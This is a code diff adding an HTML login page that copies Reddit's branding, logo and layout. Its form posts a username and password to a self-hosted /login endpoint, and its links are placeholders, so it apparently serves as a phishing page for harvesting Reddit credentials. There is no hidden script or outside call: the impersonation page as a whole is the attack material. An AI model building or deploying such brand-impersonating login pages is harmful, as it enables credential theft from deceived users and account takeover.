@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Reddit - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #dae0e6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: #fff;
+            padding: 40px 32px 32px;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 380px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .logo svg {
+            width: 60px;
+            height: 60px;
+        }
+        h1 {
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 20px;
+            text-align: center;
+            color: #1a1a1b;
+        }
+        .form-group {
+            margin-bottom: 12px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 12px;
+            background: #f6f7f8;
+            border: 1px solid #edeff1;
+            border-radius: 6px;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.3s;
+            -webkit-appearance: none;
+        }
+        .form-group input:focus {
+            border-color: #0079d3;
+        }
+        .form-group input::placeholder {
+            color: #878a8c;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: #0079d3;
+            border: none;
+            border-radius: 30px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.3s, opacity 0.2s;
+            margin-top: 10px;
+            touch-action: manipulation;
+        }
+        .login-btn:active {
+            opacity: 0.8;
+        }
+        .login-btn:hover {
+            background: #0066b8;
+        }
+        .links {
+            text-align: center;
+            margin-top: 14px;
+            font-size: 14px;
+            color: #878a8c;
+        }
+        .links a {
+            color: #0079d3;
+            text-decoration: none;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .divider {
+            text-align: center;
+            margin: 18px 0 14px;
+            color: #878a8c;
+            font-size: 13px;
+            position: relative;
+        }
+        .divider::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 50%;
+            width: 100%;
+            height: 1px;
+            background: #edeff1;
+        }
+        .divider span {
+            background: #fff;
+            padding: 0 12px;
+            position: relative;
+            z-index: 1;
+        }
+        .signup {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 14px;
+            color: #1a1a1b;
+        }
+        .signup a {
+            color: #0079d3;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .signup a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 480px) {
+            .container { padding: 25px 20px; }
+            .logo svg { width: 50px; height: 50px; }
+            h1 { font-size: 18px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 256 256"><circle cx="128" cy="128" r="128" fill="#ff4500"/><path d="M196.8 111.2c-7.2-4.8-16-7.2-24.8-7.2-8.8 0-17.6 2.4-24.8 7.2-4.8 3.2-7.2 8-7.2 12.8s2.4 9.6 7.2 12.8c7.2 4.8 16 7.2 24.8 7.2 8.8 0 17.6-2.4 24.8-7.2 4.8-3.2 7.2-8 7.2-12.8s-2.4-9.6-7.2-12.8zM172 131.2c-2.4 0-4.8-2.4-4.8-4.8s2.4-4.8 4.8-4.8 4.8 2.4 4.8 4.8-2.4 4.8-4.8 4.8z" fill="#fff"/><path d="M128 72c-13.6 0-24.8 11.2-24.8 24.8 0 8.8 4.8 16 11.2 20.8-6.4 4-12.8 9.6-16.8 16-6.4-3.2-13.6-4.8-21.6-4.8-18.4 0-33.6 13.6-33.6 30.4s15.2 30.4 33.6 30.4c8.8 0 16.8-3.2 22.4-8.8 8 6.4 18.4 10.4 30.4 10.4 22.4 0 40.8-16 40.8-35.2s-18.4-35.2-40.8-35.2z" fill="#fff"/></svg>
+        </div>
+        <h1>Log In</h1>
+        <form id="loginForm" method="POST" action="/login" autocomplete="off">
+            <div class="form-group">
+                <input type="text" name="username" placeholder="Username or email" required autocomplete="username">
+            </div>
+            <div class="form-group">
+                <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
+            </div>
+            <button type="submit" class="login-btn">Log In</button>
+            <div class="links">
+                <a href="#">Forgot password?</a>
+            </div>
+        </form>
+        <div class="divider"><span>or</span></div>
+        <div class="signup">
+            New to Reddit? <a href="#">Sign up</a>
+        </div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const btn = this.querySelector('.login-btn');
+            btn.textContent = 'Logging in...';
+            btn.disabled = true;
+            btn.style.opacity = '0.7';
+        });
+    </script>
+</body>
+</html>
